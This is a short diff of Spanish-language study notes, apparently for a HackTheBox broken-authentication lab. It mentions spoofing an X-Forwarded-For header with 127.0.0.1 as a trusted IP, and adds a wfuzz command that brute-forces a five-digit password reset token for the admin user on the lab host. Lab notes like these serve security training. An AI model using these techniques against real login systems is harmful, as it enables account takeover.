@@ -76,3 +76,8 @@ for username in usernames:
 Agregando la cabecera "X-Forwarded-For" y una ip de confianza como "127.0.0.1"
 
 
+###############Token de reseteo predecible:
+
+wfuzz -z range,00000-99999 --ss "Valid" "https://brokenauthentication.hackthebox.eu/token.php?user=admin&token=FUZZ"
+
+
